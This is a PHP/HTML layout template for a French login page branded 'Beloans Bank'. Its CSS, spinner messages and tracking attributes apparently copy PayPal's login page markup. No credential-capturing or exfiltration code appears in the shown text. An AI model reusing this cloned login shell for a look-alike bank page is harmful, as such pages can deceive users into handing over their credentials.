<!DOCTYPE html>
<!--[if lt IE 9]>
<html lang="fr" class="no-js lower-than-ie9 ie"><![endif]-->
<!--[if lt IE 10]>
<html lang="fr" class="no-js lower-than-ie10 ie"><![endif]-->
<!--[if !IE]>-->
<html  style="background-image: url('public/img/im6g.jpg'); background-repeat: no-repeat; background-size: 100%" class="js" lang="fr"><!--<![endif]-->
<head>
    <meta charset="utf-8">
    <title>Connectez-vous à votre compte Beloans</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="application-name" content="Security">

    <link rel="stylesheet" href="public/css/nel.css">
    <link rel="stylesheet" href="public/css/app.css">
    <!--[if lte IE 9]> <!--à télécharger-->
    <link rel="stylesheet" href="https://www.securityobjects.com/web/res/387/346775be7cf8bc8601d7e36afc140/css/ie9.css"/>
    <![endif]-->
    <script src="public/js/modernizr-2.js"></script>

    <style>


    </style>

    <link rel="stylesheet" href="public/css/beloans.css" type="text/css">

    <style>
        form .nativeDropdown label {
            display: block;
            margin: 0;
            line-height: 0.76923em;
            font-weight: 400;
        }

        .global-footer {
            position: relative;
            color: #fff;
            padding: 40px 0;
            z-index: 2;
            background: none;
            text-align: left;
            -webkit-transform: translate3d(0, 0, 0);
            transform: translate(0, 0);
        }

        @media screen and (min-width: 768px) {
            .ndconn{
                position: relative;
                top: -7em;
            }
        }


        form .nativeDropdown label {
            display: block;
            margin: 0;
            line-height: 0.76923em;
            font-weight: 400;
        }

        .global-footer {
            position: relative;
            color: #fff;
            padding: 40px 0;
            z-index: 2;
            background: none;
            text-align: left;
            -webkit-transform: translate3d(0, 0, 0);
            transform: translate(0, 0);
        }

        .language{
            position: relative;
            top: 7.5px;
        }

        <?php $x = 940; $w = 920; $y = -200; $z = 5; $k = 450; $e = 2000;
            while($x>300):
            $x -= 1;
            $w -= 1;
            $e -= 50;
            $y += 10;

            if($x<476){
            }
            ?>
            @media (max-width: <?= $x ?>px) {
                .containerCentered {
                    margin-right: auto;
                    margin-left: auto;
                    -moz-box-sizing: content-box;
                    box-sizing: content-box;
                    min-width: <?= $w ?>px;
                    max-width: 1150px;
                }
            }
        <?php endwhile; ?>

        #btnLogin{
            position: relative;
            left: -10px;
        }
        #btnLogin2{
            position: relative;
            left: -10px;
        }
    </style>

</head>
<body class="desktop " data-locale="fr_XC">
    <div id="main" class="main " role="main">
        <?= $content ?>
    </div>
    <div class="transitioning hide">
        <p class="checkingInfo hide">
            Vérification de vos informations...
        </p>
        <p class="oneSecond hide">
            Un instant, s'il vous plaît…
        </p>
    </div>
    <footer role="contentinfo" class="global-footer">
        <div class="containerCentered containerExtend">
            <ul style="width: 100%;" class="footer-main secondaryLik">
                <li><a href="?p=guest/create" style="color:rgba(255,255,255,1);" class="firstlinks">S'enregistrer</a></li>
                <li><a href="?p=guest/login" style="color:rgba(255,255,255,1);" class="firstlinks">Se connecter</a></li>
                <li><a href="#" style="color:rgba(255,255,255,1);" class="firstlinks">Faq</a></li>
                <li><a href="#" style="color:rgba(255,255,255,1);" class="firstlinks">Contact</a></li>
                <li class="country-selector ">
                    <a class="language" style="color:rgba(255,255,255,1);" data-pa-click="footer|country-selector" href="#">English</a>
                    <a class="language" style="color:rgba(255,255,255,1);" data-pa-click="footer|country-selector" href="#">Français</a>
                </li>
            </ul>
            <hr>
            <div align="center">
                <ul class="copyright-section secondaryLink">
                    <li id="footer-copyright" class="footer-copyright" style="color:#000;">© 2011–<?= date('Y') ?> Beloans Bank Tous droits réservés.</li>
                    <li id="footer-privacy">
                        <a href="#">Respect de la vie privée</a></li>
                    <li class="footer-legal"><a href="#">Juridique</a></li>
                    <li id="siteFeedback" class="">
                        <a data-pa-click="footer|SiteFeedback" href="?p=welcome/index/#">Évaluation</a>
                    </li>
                </ul>
            </div>
        </div>
    </footer>
    <script src="public/admin/plugins/jQuery/jquery-2.2.3.min.js"></script>
    <script src="public/admin/bootstrap/js/bootstrap.min.js"></script>
    <script>
        $('#oublier').click(function () {
            $('#connexion').hide('slow');
            $('#oublieur').show('slow');
        });

        $('#connect').click(function () {
            $('#connexion').show('slow');
            $('#oublieur').hide('slow');
        });

        $(function () {
            $('#oublieur').hide();
        })
    </script>
</body>
</html>